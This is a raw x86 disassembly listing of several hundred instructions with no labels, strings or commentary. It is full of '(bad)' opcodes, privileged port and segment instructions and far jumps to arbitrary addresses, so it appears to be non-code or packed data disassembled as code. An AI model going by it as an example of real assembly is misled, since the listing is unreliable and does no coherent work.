  415361:	xor    DWORD PTR [esi+ebp*8],eax
  415364:	pop    edx
  415365:	mov    ds:0xa2e5c0f6,eax
  41536a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41536b:	fcmovnbe st,st(0)
  41536d:	ficom  WORD PTR [edx-0x28c5f72b]
  415373:	mov    ecx,0xcaf26fc
  415378:	dec    eax
  415379:	push   es
  41537a:	jb     0x4153ca
  41537c:	jp     0x415338
  41537e:	test   edx,ecx
  415380:	mov    ss,WORD PTR [ebx+0x74]
  415383:	xlat   BYTE PTR ds:[ebx]
  415384:	mov    edx,0xebf9e1bb
  415389:	out    0xf2,al
  41538b:	jns    0x415395
  41538d:	adc    edx,DWORD PTR [esi]
  41538f:	lahf   
  415390:	xor    bl,BYTE PTR fs:[ebp+0x49566a7a]
  415397:	lahf   
  415398:	(bad)  
  415399:	jecxz  0x4153ed
  41539b:	(bad)  
  41539c:	dec    edi
  41539d:	sub    eax,0xefc0602a
  4153a2:	int    0x9e
  4153a4:	and    BYTE PTR [esi+0x6],bl
  4153a7:	test   BYTE PTR [ebx-0x14366252],al
  4153ad:	dec    ebp
  4153ae:	loope  0x4153a4
  4153b0:	pop    ss
  4153b1:	jbe    0x415355
  4153b3:	and    edi,DWORD PTR [edx+0x2a]
  4153b6:	lods   eax,DWORD PTR ds:[esi]
  4153b7:	cdq    
  4153b8:	ficomp DWORD PTR [eax+0x73]
  4153bb:	add    eax,eax
  4153bd:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4153bf:	mov    DWORD PTR [edx],esi
  4153c1:	inc    edx
  4153c2:	pop    ecx
  4153c3:	fcomp  QWORD PTR [ebp-0x289bf3eb]
  4153c9:	sub    BYTE PTR [ecx-0x4d],ch
  4153cc:	jne    0x41541e
  4153ce:	mov    dh,0x13
  4153d0:	mov    ch,0xa9
  4153d2:	fsubrp st(0),st
  4153d4:	sub    eax,0x8473d00f
  4153d9:	(bad)  [edx+eax*2+0x2e]
  4153dd:	ins    DWORD PTR es:[edi],dx
  4153de:	les    edi,FWORD PTR [edx-0x66]
  4153e1:	icebp  
  4153e2:	aaa    
  4153e3:	addr16 inc esi
  4153e5:	cs inc esi
  4153e7:	pop    ebx
  4153e8:	and    bh,BYTE PTR [ecx+0x2e]
  4153eb:	cmp    cl,BYTE PTR [ebx+eiz*2+0x45]
  4153ef:	shl    ecx,cl
  4153f1:	dec    edx
  4153f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153f3:	sbb    DWORD PTR [edx],esi
  4153f5:	push   es
  4153f6:	push   ecx
  4153f7:	mov    ch,0xc1
  4153f9:	fwait
  4153fa:	retf   0xb346
  4153fd:	xchg   ebx,eax
  4153fe:	and    esi,0x2d80ae91
  415404:	xchg   ecx,eax
  415405:	fbld   TBYTE PTR [eax]
  415407:	sub    cl,BYTE PTR [edi-0x240f1f1a]
  41540d:	mov    dh,0x28
  41540f:	push   esp
  415410:	mov    WORD PTR [esi],ds
  415412:	stc    
  415413:	sub    edi,DWORD PTR ds:0x544cefe4
  415419:	adc    ecx,DWORD PTR [esi-0x1]
  41541c:	sbb    eax,0x7d1ff93b
  415421:	inc    edx
  415422:	xchg   edi,eax
  415423:	sub    dl,BYTE PTR [ecx+edx*1+0x43]
  415427:	mov    eax,0xf0eb830
  41542c:	cmp    BYTE PTR [ebx+0x1976f73f],bl
  415432:	(bad)  
  415433:	(bad)
  415436:	push   ss
  415437:	mov    edi,0x67d2158d
  41543c:	pop    esi
  41543d:	xchg   edx,eax
  41543e:	shr    DWORD PTR [edi+0x1a],cl
  415441:	xchg   ebx,eax
  415442:	es dec eax
  415444:	xchg   ebp,eax
  415445:	stc    
  415446:	lods   eax,DWORD PTR ds:[esi]
  415447:	mov    esp,0x1322106c
  41544c:	fstp   TBYTE PTR [esi]
  41544e:	adc    BYTE PTR [edx+edi*2+0x7],0xf6
  415453:	pop    ss
  415454:	int3   
  415455:	dec    esi
  415456:	push   eax
  415457:	dec    edi
  415458:	lock lods al,BYTE PTR ds:[si]
  41545b:	jl     0x4154b7
  41545d:	jl     0x4154a7
  41545f:	add    DWORD PTR [eax+edi*8-0x57],eax
  415463:	xor    ch,BYTE PTR [edx+eax*4]
  415466:	mov    esi,0xa8b6052d
  41546b:	dec    ebp
  41546c:	pop    ds
  41546d:	cdq    
  41546e:	dec    ecx
  41546f:	pop    esi
  415470:	adc    edx,DWORD PTR [esi+0xdf3d342]
  415476:	mov    dl,0xe3
  415478:	cmc    
  415479:	pop    ebx
  41547a:	jle    0x415488
  41547c:	retf   
  41547d:	in     al,0x27
  41547f:	jbe    0x4154b3
  415481:	push   esi
  415482:	scas   al,BYTE PTR es:[edi]
  415483:	xchg   ecx,eax
  415484:	jno    0x4154fc
  415486:	jb     0x415501
  415488:	imul   esp,DWORD PTR [ebx+ebp*1-0x73c7a31f],0x55
  415490:	pop    ebp
  415491:	loop   0x4154e4
  415493:	nop
  415494:	mov    edx,0x6326897c
  415499:	pop    eax
  41549a:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41549c:	repnz or BYTE PTR [esi-0x4a],ch
  4154a0:	mov    ebx,0x9a12eaf6
  4154a5:	enter  0xc8e0,0xf4
  4154a9:	loope  0x4154ad
  4154ab:	dec    ebx
  4154ac:	mov    dl,0x76
  4154ae:	xor    al,0x71
  4154b0:	push   esi
  4154b1:	dec    eax
  4154b2:	adc    BYTE PTR [eax+0x41],0xaf
  4154b6:	fisttp DWORD PTR [eax+0x1e]
  4154b9:	mov    eax,0xa2c8d37c
  4154be:	clc    
  4154bf:	xchg   ebp,eax
  4154c0:	and    DWORD PTR [ebp-0x69],eax
  4154c3:	pop    ss
  4154c4:	adc    dh,BYTE PTR [esi]
  4154c6:	std    
  4154c7:	fnstenv [ecx+0x650730b0]
  4154cd:	je     0x415479
  4154cf:	dec    edi
  4154d0:	push   edi
  4154d1:	mov    cl,0x9
  4154d3:	or     dl,BYTE PTR [ecx+0x5c754275]
  4154d9:	jae    0x415473
  4154db:	stc    
  4154dc:	int3   
  4154dd:	ss ss dec esp
  4154e0:	into   
  4154e1:	xor    DWORD PTR ds:0x116be397,0xffffffdd
  4154e8:	or     eax,0x4fe1a0eb
  4154ed:	dec    edi
  4154ee:	xchg   DWORD PTR [edi],ecx
  4154f0:	mul    BYTE PTR ds:0x763612bf
  4154f6:	mov    ebx,DWORD PTR ds:0x46f25460
  4154fc:	sbb    al,0x66
  4154fe:	psrld  mm3,QWORD PTR [ecx-0x74a272fc]
  415505:	pop    ebx
  415506:	jmp    FWORD PTR [ecx]
  415508:	mov    edx,0x4ecc7c82
  41550d:	jmp    0xe2df:0x8f81ca5e
  415514:	xchg   ebx,eax
  415515:	mov    dl,0x20
  415517:	and    eax,0x57b3d9e4
  41551c:	xor    BYTE PTR [ecx-0x80],0x6e
  415520:	or     esi,esi
  415522:	pop    edi
  415523:	(bad)  
  415524:	out    dx,al
  415525:	sub    al,0x32
  415527:	fdivr  DWORD PTR [eax-0x7a]
  41552a:	mov    ch,0xe3
  41552c:	lea    ecx,[eax-0x58]
  41552f:	sbb    ecx,DWORD PTR [edx+0x211c27f2]
  415535:	in     eax,0xc6
  415537:	push   esi
  415538:	repnz add ah,BYTE PTR [eax]
  41553b:	outs   dx,BYTE PTR ss:[esi]
  41553d:	push   0x39
  41553f:	loop   0x415593
  415541:	adc    al,0xbb
  415543:	jns    0x4155b7
  415545:	push   ss
  415546:	lods   eax,DWORD PTR ds:[esi]
  415547:	jns    0x4154f5
  415549:	mov    bl,0x18
  41554b:	in     eax,0xea
  41554d:	ins    DWORD PTR es:[edi],dx
  41554e:	mov    eax,0x490323f9
  415553:	out    dx,al
  415554:	jmp    0xc914:0xc267933d
  41555b:	sub    esp,DWORD PTR [ebx]
  41555d:	pop    ebp
  41555e:	rcl    BYTE PTR [eax+0x46],cl
  415561:	test   DWORD PTR [ebp-0x15],0x6d39c5cb
  415568:	pusha  
  415569:	sub    ecx,edi
  41556b:	xor    DWORD PTR [edi],0x3ebc0e0e
  415571:	sbb    al,0x5a
  415573:	add    BYTE PTR [ecx],cl
  415575:	xor    DWORD PTR [edx],eax
  415577:	inc    edi
  415578:	jl     0x415581
  41557a:	ret    0x405e
  41557d:	or     ebp,ebx
  41557f:	push   eax
  415580:	inc    ebx
  415581:	repz sub BYTE PTR [esi+0x2],ah
  415585:	jnp    0x415549
  415587:	push   esi
  415588:	popa   
  415589:	imul   DWORD PTR [edi-0x43]
  41558c:	fwait
  41558d:	jmp    0x4155c5
  41558f:	ja     0x415566
  415591:	lods   eax,DWORD PTR ds:[esi]
  415592:	call   DWORD PTR [edx]
  415594:	pop    ebx
  415595:	imul   esi,ecx,0xffffffa3
  415598:	sub    ecx,esp
  41559a:	sbb    dh,BYTE PTR [ebx-0x7808a279]
  4155a0:	or     BYTE PTR [edi],ah
  4155a2:	pop    ebx
  4155a3:	jp     0x415544
  4155a5:	pop    ecx
  4155a6:	fwait
  4155a7:	mov    bh,BYTE PTR [eax-0x5653eeff]
  4155ad:	jge    0x415627
  4155af:	xchg   ebx,eax
  4155b0:	(bad)  
  4155b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155b2:	xchg   edx,eax
  4155b3:	sub    al,0x4c
  4155b5:	aaa    
  4155b6:	xchg   edi,eax
  4155b7:	shl    ecx,cl
  4155b9:	jo     0x415613
  4155bb:	lods   al,BYTE PTR ds:[esi]
  4155bc:	aam    0x17
  4155be:	sti    
  4155bf:	fs and al,0x5f
  4155c2:	imul   edx,eax,0xffffffcf
  4155c5:	call   0x24bf:0x737fdcd2
  4155cc:	sub    ah,ah
  4155ce:	pop    esi
  4155cf:	in     eax,dx
  4155d0:	into   
  4155d1:	sub    BYTE PTR [ebp-0x2d],0xf6
  4155d5:	pop    edi
  4155d6:	stc    
  4155d7:	cmp    ah,BYTE PTR [ebp-0x7b]
  4155da:	(bad)  
  4155db:	adc    BYTE PTR [eax-0x68d13be],al
  4155e1:	fs int 0x3f
  4155e4:	mov    ebp,0xecd754c
  4155e9:	sahf   
  4155ea:	cs adc edx,ecx
  4155ed:	mov    cl,0xcf
  4155ef:	xor    ebp,DWORD PTR [ecx]
  4155f1:	shl    BYTE PTR [edi+0xe],1
  4155f4:	inc    ecx
  4155f5:	mov    ebx,0x17980b7c
  4155fa:	pushf  
  4155fb:	imul   DWORD PTR [ebx-0x54]
  4155fe:	hlt    
  4155ff:	xchg   ebx,eax
  415600:	leave  
  415601:	push   ecx
  415602:	fwait
  415603:	sub    dh,BYTE PTR [edx+0x492742bc]
  415609:	mov    bl,0xab
  41560b:	xor    ebp,DWORD PTR [esi-0x54]
  41560e:	bound  ebp,QWORD PTR [edx]
  415610:	sbb    dl,BYTE PTR [ebx]
  415612:	mov    al,0x3c
  415614:	lock scas al,BYTE PTR es:[edi]
  415616:	and    ch,ch
  415618:	or     ch,BYTE PTR [ecx+0x1f]
  41561b:	xchg   ebx,eax
  41561c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41561d:	jae    0x415685
  41561f:	mov    bl,dl
  415621:	ror    ah,1
  415623:	in     eax,0x3
  415625:	repnz xchg edx,eax
  415627:	stc    
  415628:	mov    esi,0xf901f33c
  41562d:	dec    eax
  41562e:	int    0x80
  415630:	push   ds
  415631:	mov    WORD PTR [esi],fs
  415633:	mov    ah,cl
  415635:	mov    ebp,0x6a290739
  41563a:	scas   eax,DWORD PTR es:[edi]
  41563b:	and    al,bh
  41563d:	jo     0x4155f3
  41563f:	inc    ebx
  415640:	xor    al,0xde
  415642:	leave  
  415643:	push   ebx
  415644:	int3   
  415645:	retf   0x12d1
  415648:	push   es
  415649:	push   0xc8146dc8
  41564e:	fiadd  DWORD PTR [edi]
  415650:	fistp  QWORD PTR [ebp+0x2a]
  415653:	imul   ebp,DWORD PTR [ebx-0x1d],0xffffffce
  415657:	jp     0x415673
  415659:	(bad)  
  41565a:	mov    eax,0x42158463
  41565f:	sbb    eax,0x9bc04873
  415664:	fdivr  DWORD PTR [edi]
  415666:	jle    0x41562c
  415668:	shl    BYTE PTR [ebx],1
  41566a:	loopne 0x41566b
  41566c:	xchg   ebp,eax
  41566d:	fld    QWORD PTR [esi+0x4173107c]
  415673:	pop    esi
  415674:	jne    0x4156dd
  415676:	bound  esi,QWORD PTR [eax-0x6c219846]
  41567c:	and    ebx,esi
  41567e:	xor    ah,bl
  415680:	ds aaa 
  415682:	push   esp
  415683:	xor    esp,DWORD PTR [edx+esi*4-0x50e7d037]
  41568a:	sbb    DWORD PTR [edi],esp
  41568c:	dec    DWORD PTR [ebp+0x69]
  41568f:	aad    0x77
  415691:	adc    eax,0x74726286
  415696:	mov    BYTE PTR [edx-0x5a9ab9f2],ch
  41569c:	mov    ss,WORD PTR [ebx+0x2a70b47e]
  4156a2:	mov    ecx,0x8ecdf41e
  4156a7:	sbb    eax,0xf5654fbb
  4156ac:	(bad)  
  4156ad:	jo     0x41571f
  4156af:	jno    0x41571a
  4156b1:	inc    esp
  4156b2:	into   
  4156b3:	fsubrp st(0),st
  4156b5:	mov    ds,ebx
  4156b7:	dec    esi
  4156b8:	(bad)
  4156bc:	test   ebp,edi
  4156be:	rol    BYTE PTR [edx-0x40],1
  4156c1:	mov    dl,0xe3
  4156c3:	pop    ecx
  4156c4:	cs call 0xd6efd712
  4156ca:	push   0x1e
  4156cc:	int    0xd9
  4156ce:	ds int 0xfc
  4156d1:	xchg   ebx,eax
  4156d2:	or     esp,DWORD PTR [eax-0x2c]
  4156d5:	add    BYTE PTR [esi+0x3d],ch
  4156d8:	jne    0x4156b0
  4156da:	dec    esp
  4156db:	into   
  4156dc:	pop    eax
  4156dd:	pop    esi
  4156de:	xor    DWORD PTR [ebx-0x68],0xdddb07f
  4156e5:	arpl   WORD PTR [esi+0x72],di
  4156e8:	pop    edi
  4156e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156ea:	inc    eax
  4156eb:	into   
  4156ec:	mov    eax,ds:0x4d1e544b
  4156f1:	mov    edi,0x38bae5a5
  4156f6:	out    0xb0,eax
  4156f8:	out    0x1,eax
  4156fa:	xor    DWORD PTR [ebx],edi
  4156fc:	data16 xor BYTE PTR [ecx-0x63],al
  415700:	(bad)  
  415701:	xlat   BYTE PTR ds:[ebx]
  415702:	push   ds
  415703:	das    
  415704:	mov    eax,0x5e6e04e4
  415709:	add    al,0xb9
  41570b:	data16 aad 0xdc
  41570e:	push   0x246e0961
  415713:	or     bl,BYTE PTR [eax]
  415715:	(bad)  
  415716:	(bad)  
  415717:	jg     0x415703
  415719:	push   0x84dfe8d8
  41571e:	leave  
  41571f:	cmp    al,0x2b
  415721:	xor    DWORD PTR [eax+0x4175b589],0xffffff84
  415728:	or     DWORD PTR [edi],ebp
  41572a:	mov    edi,0x7691c931
  415730:	fwait
  415731:	cmp    eax,0x5a01d1b1
  415736:	push   0xffffff92
  415738:	inc    edx
  415739:	push   ss
  41573a:	and    ebp,edi
  41573c:	scas   al,BYTE PTR es:[edi]
  41573d:	enter  0x7094,0xfc
  415741:	pop    eax
  415742:	xor    al,0x7d
  415744:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415745:	dec    esi
  415746:	hlt    
  415747:	ret    0x30f4
  41574a:	in     al,0x41
  41574c:	dec    ecx
  41574d:	mov    ecx,0xc29d917c
  415752:	and    eax,0x808d173c
  415757:	repz (bad) 
  415759:	(bad)  
  41575a:	sahf   
  41575b:	loope  0x41578e
  41575d:	xchg   ebp,eax
  41575e:	in     al,dx
  41575f:	outs   dx,BYTE PTR ds:[esi]
  415760:	jno    0x4156f3
  415762:	retf   
  415763:	mov    edi,0xc2b4a092
  415768:	inc    eax
  415769:	jnp    0x415714
  41576b:	mov    esp,0xac579fc4
  415770:	xor    BYTE PTR [ebx-0x3247cf8b],cl
  415776:	test   al,0xd8
  415778:	sbb    ebp,DWORD PTR [ebx+0x9]
  41577b:	jo     0x4157de
  41577d:	pop    ebp
  41577e:	add    al,0x58
  415780:	int    0xe8
  415782:	imul   esp,DWORD PTR [ecx],0x2a
  415785:	sub    al,0xa6
  415787:	int3   
  415788:	jb     0x415794
  41578a:	push   ds
  41578b:	ror    bl,1
  41578d:	mov    al,ds:0xe81ebad9
  415792:	call   0xda6abbc6
  415797:	push   ebx
  415798:	push   0xcffa99dd
  41579d:	repz out 0x24,al
  4157a0:	retf   
  4157a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157a2:	fld    TBYTE PTR [ecx]
  4157a4:	mov    dh,0x9e
  4157a6:	xchg   eax,ebp
  4157a8:	fdiv   QWORD PTR [eax+0x355d45a3]
  4157ae:	sub    eax,0xd134777a
  4157b3:	rcr    DWORD PTR [edi-0x5],1
  4157b6:	sub    bl,BYTE PTR [eax-0xe]
  4157b9:	pop    ebp
  4157ba:	retf   0x2346
  4157bd:	xchg   edi,eax
  4157be:	inc    edi
  4157bf:	fmul   QWORD PTR [edx+0xb]
  4157c2:	addr16 dec edx
  4157c4:	mov    esp,0xc5bc2f1
  4157c9:	fs jne 0x415803
  4157cc:	popa   
  4157cd:	hlt    
  4157ce:	push   ebp
  4157cf:	pusha  
  4157d0:	sub    eax,0x3d882df0
  4157d5:	inc    edx
  4157d6:	dec    eax
  4157d7:	test   al,0xa0
  4157d9:	cli    
  4157da:	rol    DWORD PTR [ebx],0xe7
  4157dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157de:	mov    cl,ch
  4157e0:	pusha  
  4157e1:	adc    edi,DWORD PTR [eax]
  4157e3:	ins    BYTE PTR es:[edi],dx
  4157e4:	lods   eax,DWORD PTR ds:[esi]
  4157e5:	ret    0xee67
  4157e8:	mov    DWORD PTR [edi+0x33f5ac47],0x5c080d38
  4157f2:	in     eax,dx
  4157f3:	add    bh,BYTE PTR [eax+esi*4]
  4157f6:	lods   al,BYTE PTR ds:[esi]
  4157f7:	std    
  4157f8:	aad    0x19
  4157fa:	pop    ds
  4157fb:	xchg   ecx,eax
  4157fc:	sbb    BYTE PTR [ecx-0x5],cl
  4157ff:	shr    BYTE PTR [esi+0xf],1
  415802:	push   0xffffffbb
  415804:	stc    
  415805:	mov    al,ds:0x8513fe07
  41580a:	ins    BYTE PTR es:[edi],dx
  41580b:	hlt    
  41580c:	fbld   TBYTE PTR [edx+0x27059f92]
  415812:	fdivr  QWORD PTR [edx-0xb437b4d]
  415818:	lds    ebp,FWORD PTR [ecx-0x40f600f9]
  41581e:	cwde   
  41581f:	add    DWORD PTR [edi+0x273a2b4c],ebp
  415825:	cs push esp
  415827:	(bad)  
  415828:	fsub   DWORD PTR [ebx-0x54]
  41582b:	popa   
  41582c:	mov    edx,0xe9ceb71b
  415831:	push   ebx
  415832:	xor    al,0x94
  415834:	dec    esi
  415835:	dec    ecx
  415836:	(bad)  
  415837:	out    0x13,al
  415839:	xchg   edx,eax
  41583a:	fwait
  41583b:	xlat   BYTE PTR ds:[ebx]
  41583c:	ss int 0xbc
  41583f:	dec    ebp
  415840:	in     eax,dx
  415841:	(bad)  
  415842:	jb     0x41586c
  415844:	sbb    cl,cl
  415846:	mov    ch,0x48
  415848:	fisttp QWORD PTR [ecx-0x1433c8f6]
  41584e:	cmp    al,0x4a
  415850:	shl    esp,cl
  415852:	sar    bh,1
  415854:	xor    eax,0xedd60862
  415859:	xor    bh,bh
  41585b:	and    edx,eax
  41585d:	adc    bl,dl
  41585f:	xor    al,0x79
  415861:	aad    0x68
  415863:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415864:	ficomp WORD PTR ds:0xd63215e6
  41586a:	outs   dx,DWORD PTR ds:[esi]
  41586b:	frstor [eax+ecx*2]
  41586e:	dec    eax
  41586f:	cmp    ecx,DWORD PTR gs:[ebx]
  415872:	sub    BYTE PTR [eax+0x79],dl
  415875:	test   BYTE PTR [edx+0x65],cl
  415878:	adc    al,0xc
  41587a:	out    dx,al
  41587b:	repnz dec esp
  41587d:	retf   0xac93
  415880:	aam    0x53
  415882:	xchg   DWORD PTR [ebx],esi
  415884:	cwde   
  415885:	fs push cs
  415887:	xchg   ebx,eax
  415888:	lods   eax,DWORD PTR ds:[esi]
  415889:	pop    esp
  41588a:	xchg   ebp,eax
  41588b:	xchg   ecx,eax
  41588c:	js     0x415831
  41588e:	call   0xb82f:0x3d32124a
  415895:	mov    esi,DWORD PTR [ecx-0x3183ce50]
  41589b:	gs cmp eax,0xe2b62880
  4158a1:	dec    esp
  4158a2:	in     eax,0xbc
  4158a4:	mov    edx,0xc2589ad8
  4158a9:	sub    ebx,DWORD PTR [esi]
  4158ab:	jecxz  0x41590e
  4158ad:	dec    ebx
  4158ae:	std    
  4158af:	hlt    
  4158b0:	shr    DWORD PTR [esi],1
  4158b2:	adc    ebp,DWORD PTR ds:0xa1d7d515
  4158b8:	pop    ebx
  4158b9:	ds aaa 
  4158bb:	jp     0x415902
  4158bd:	imul   BYTE PTR [ecx-0x75]
  4158c0:	in     eax,0xd
  4158c2:	jmp    DWORD PTR [ecx+0x4b]
  4158c5:	out    dx,al
  4158c6:	fs adc eax,0xbae4efe4
  4158cc:	xchg   ebx,eax
  4158cd:	xlat   BYTE PTR ds:[ebx]
  4158ce:	jns    0x415934
  4158d0:	mov    ds:0x78b3e8ae,eax
  4158d5:	and    dl,BYTE PTR [ecx-0x2f]
  4158d8:	jbe    0x415874
  4158da:	mov    edx,0x8fe68b33
  4158df:	push   0xffffff80
  4158e1:	adc    dh,BYTE PTR ds:0x9acb8273
  4158e7:	lods   al,BYTE PTR ds:[esi]
  4158e8:	inc    ecx
  4158e9:	sbb    al,0xd9
  4158eb:	fabs   
  4158ed:	(bad)  
  4158ee:	inc    ecx
  4158ef:	mov    esi,ebx
  4158f1:	fimul  DWORD PTR [ebx+edx*1-0x15ad22fc]
  4158f8:	js     0x41592b
  4158fa:	pop    es
  4158fb:	mov    ebp,0x4c467ba2
  415900:	cmp    eax,0x271f7ef8
  415905:	fsubr  st(3),st
  415907:	cmp    bh,dl
  415909:	pop    ebx
  41590a:	add    al,0x7b
  41590c:	imul   esi,DWORD PTR ds:0x64b1bb9b,0xd92b1c8d
  415916:	fs cdq 
  415918:	cld    
  415919:	gs fs and eax,0x26233e55
  415920:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415921:	fisub  DWORD PTR [esi]
  415923:	mov    dh,0xde
  415925:	sbb    ebx,DWORD PTR [edx]
  415927:	outs   dx,BYTE PTR ds:[esi]
  415928:	into   
  415929:	xchg   edi,eax
  41592a:	mov    ds:0x3639d8c1,eax
  41592f:	cdq    
  415930:	call   0x91a025cf
  415935:	mov    bh,0x1a
  415937:	mov    esp,0x805fb3cb
  41593c:	push   ebp
  41593d:	sub    al,0xff
  41593f:	scas   eax,DWORD PTR es:[edi]
  415940:	push   edx
  415941:	(bad)  
  415943:	push   0xad34e5dc
  415948:	fisub  DWORD PTR [edx+0x3]
  41594b:	sbb    al,0xda
  41594d:	mov    al,ds:0x47f3e568
  415952:	jp     0x415907
  415954:	iret   
  415955:	das    
  415956:	into   
  415957:	(bad)  
  415958:	mov    bl,0x6d
  41595a:	mov    ds:0x3139d91b,eax
  41595f:	jbe    0x4158f1
  415961:	add    DWORD PTR [ebp-0x30],0xf32bb2d
  415968:	jns    0x4159c6
  41596a:	lahf   
  41596b:	push   esi
  41596c:	stos   BYTE PTR es:[edi],al
  41596d:	cs icebp 
  41596f:	mov    eax,ds:0x6ced4373
  415974:	sbb    eax,0x4ce19ee8
  415979:	mov    dh,0xac
  41597b:	push   ecx
  41597c:	mov    DWORD PTR [edx],ebx
  41597e:	cmp    eax,0xc974c683
  415983:	test   BYTE PTR [ebp-0x1821e100],dl
  415989:	test   DWORD PTR [edi+edx*8+0x4a],edi
  41598d:	into   
  41598e:	jns    0x4159cc
  415990:	lods   al,BYTE PTR ds:[esi]
  415991:	and    esi,DWORD PTR [ebp+0x4039abba]
  415997:	sti    
  415998:	sbb    BYTE PTR [eax+0x69e32308],cl
  41599e:	fadd   QWORD PTR [eax-0x73d22022]
  4159a4:	lods   eax,DWORD PTR ds:[esi]
  4159a5:	inc    ebx
  4159a6:	or     bl,cl
  4159a8:	dec    ebp
  4159a9:	clc    
  4159aa:	sbb    BYTE PTR [ebx-0xa7b2c34],dl
  4159b0:	jb     0x415980
  4159b2:	xor    edx,esp
  4159b4:	xlat   BYTE PTR ds:[ebx]
  4159b5:	jae    0x415a03
  4159b7:	pop    es
  4159b8:	call   0xe8ee:0x119ef19a
  4159bf:	ror    dl,cl
  4159c1:	das    
  4159c2:	gs sahf 
  4159c4:	arpl   WORD PTR [eax-0x80],ax
  4159c7:	lahf   
  4159c8:	dec    esi
  4159c9:	call   0xd2df261a
  4159ce:	stos   DWORD PTR es:[edi],eax
  4159cf:	pop    ecx
  4159d0:	sub    dl,ch
  4159d2:	jo     0x415966
  4159d4:	xlat   BYTE PTR ds:[ebx]
  4159d5:	sub    DWORD PTR [edx],ebx
  4159d7:	rcl    BYTE PTR [edx-0x46657cbd],cl
  4159dd:	arpl   WORD PTR [esi+0x3b],bp
  4159e0:	xor    edi,DWORD PTR [ebp-0x27b2692d]
  4159e6:	add    DWORD PTR [edi+edx*8+0x4537330b],ebx
  4159ed:	jp     0x4159f9
  4159ef:	cwde   
  4159f0:	add    edx,DWORD PTR [ecx]
  4159f2:	fwait
  4159f3:	cmp    al,al
  4159f5:	push   0xffffffc2
  4159f7:	add    al,0x7b
  4159f9:	loope  0x4159cc
  4159fb:	mov    WORD PTR [edi-0x528a8b51],sp
  415a02:	or     al,0xdc
  415a05:	cmp    dl,bh
  415a07:	js     0x4159b4
  415a09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a0a:	dec    eax
  415a0b:	aas    
  415a0c:	add    eax,0xf9aa6f09
  415a11:	pop    edx
  415a12:	(bad)  
  415a14:	xlat   BYTE PTR ds:[ebx]
  415a15:	push   ebp
  415a16:	(bad)  
  415a17:	retf   0xef50
  415a1a:	or     ebp,ecx
  415a1c:	pop    es
  415a1d:	mov    dl,0xec
  415a1f:	out    0xaa,eax
  415a21:	sub    BYTE PTR [eax],al
  415a23:	adc    eax,0xd01a35fd
  415a28:	hlt    
  415a29:	popf   
  415a2a:	mov    DWORD PTR [ebp+0x64],ebx
  415a2d:	bound  edi,QWORD PTR [esi]
  415a2f:	in     eax,dx
  415a30:	iret   
  415a31:	jno    0x4159fc
  415a33:	aad    0x75
  415a35:	jae    0x4159e7
  415a37:	push   ds
  415a38:	ret    
  415a39:	mov    ebp,ds
  415a3b:	mov    ebx,0xeb9123ab
  415a40:	dec    ecx
  415a41:	scas   eax,DWORD PTR es:[edi]
  415a42:	jg     0x415a19
  415a44:	loop   0x415a64
  415a46:	or     eax,0x31a0157f
  415a4b:	into   
  415a4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a4d:	or     DWORD PTR [edx+0x56],ecx
  415a50:	sbb    al,0x59
  415a52:	aam    0x62
  415a54:	stc    
  415a55:	push   cs
  415a56:	repnz jmp 0x2219:0xb6b438aa
  415a5e:	retf   0x9d1d
  415a61:	jg     0x415a69
  415a63:	pop    ds
  415a64:	adc    edi,DWORD PTR [esi+0x165e17d1]
  415a6a:	jge    0x415a82
  415a6c:	rol    BYTE PTR [edi-0x3f4bb137],0xb
  415a73:	jbe    0x415a26
  415a75:	mov    ds:0x18e5458,eax
  415a7a:	sbb    al,0x69
  415a7c:	repnz sub BYTE PTR [edi+0xad22f2f],bl
  415a83:	sub    al,0x4
  415a85:	mov    edx,0x5e41baca
  415a8a:	and    edx,DWORD PTR [ecx+0x66]
  415a8d:	adc    dl,ah
  415a8f:	mov    gs,WORD PTR [ebx]
  415a91:	jp     0x415a29
  415a93:	xchg   esp,eax
  415a94:	cli    
  415a95:	xchg   DWORD PTR [ebx],ebx
  415a97:	mov    edx,0x99fa3878
  415a9c:	popf   
  415a9d:	in     eax,0x43
  415a9f:	pop    ecx
  415aa0:	mov    ds:0xee8e3ec3,eax
  415aa5:	popf   
  415aa6:	jp     0x415b0d
  415aa8:	push   esi
  415aa9:	add    DWORD PTR [edi-0x19],esi
  415aac:	(bad)  
  415aad:	mov    bh,0x94
  415aaf:	cmp    al,0x53
  415ab1:	sti    
  415ab2:	jns    0x415aa6
  415ab4:	ja     0x415a42
  415ab6:	add    ch,0xb9
  415ab9:	call   0xa5c4:0x802ce89b
  415ac0:	ror    BYTE PTR [ebx+0x33],1
  415ac3:	fisub  DWORD PTR [ebx]
  415ac5:	in     eax,dx
  415ac6:	das    
  415ac7:	out    0x4b,al
  415ac9:	cli    
  415aca:	out    dx,al
  415acb:	jle    0x415aa3
  415acd:	add    cl,bh
  415acf:	push   0x6c08eb7
  415ad4:	or     esi,DWORD PTR [edx]
  415ad6:	dec    ebx
  415ad7:	jnp    0x415b27
  415ad9:	ins    BYTE PTR es:[edi],dx
  415ada:	push   es
  415adb:	xchg   ebp,eax
  415adc:	aas    
  415add:	nop
  415ade:	(bad)  
  415adf:	lods   al,BYTE PTR ds:[esi]
  415ae0:	ffree  st(6)
  415ae2:	push   edi
  415ae3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ae4:	(bad)  
  415ae5:	enter  0x398d,0x26
  415ae9:	add    ecx,eax
  415aeb:	jo     0x415aeb
  415aed:	pop    esi
  415aee:	lahf   
  415aef:	mov    ch,0xa8
  415af1:	xchg   ecx,eax
  415af2:	push   eax
  415af3:	test   DWORD PTR ss:[eax+esi*2+0x2e],ebx
  415af8:	sub    eax,0x93d4e6ac
  415afd:	(bad)  
  415afe:	data16 out 0x2,al
  415b01:	jge    0x415af8
  415b03:	pop    ds
